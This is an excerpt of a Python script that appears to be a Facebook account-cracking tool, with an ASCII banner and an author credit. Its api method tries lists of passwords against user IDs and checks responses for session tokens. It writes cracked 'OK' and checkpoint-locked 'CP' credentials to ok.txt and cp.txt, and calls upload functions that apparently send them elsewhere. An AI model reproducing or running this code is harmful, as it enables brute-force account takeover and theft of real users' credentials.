...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Hackerboy679.approvel "])
	exit(" [*] FACEBOOK :  MD BILAL KHAN")
...
\______   \__|  | _____  |  |   |  | _|  |__ _____    ____   
 |    |  _/  |  | \__  \ |  |   |  |/ /  |  \\__  \  /    \  
 |    |   \  |  |__/ __ \|  |__ |    <|   Y  \/ __ \|   |  \ 
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Bilal-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[Bilal-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Bilal-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
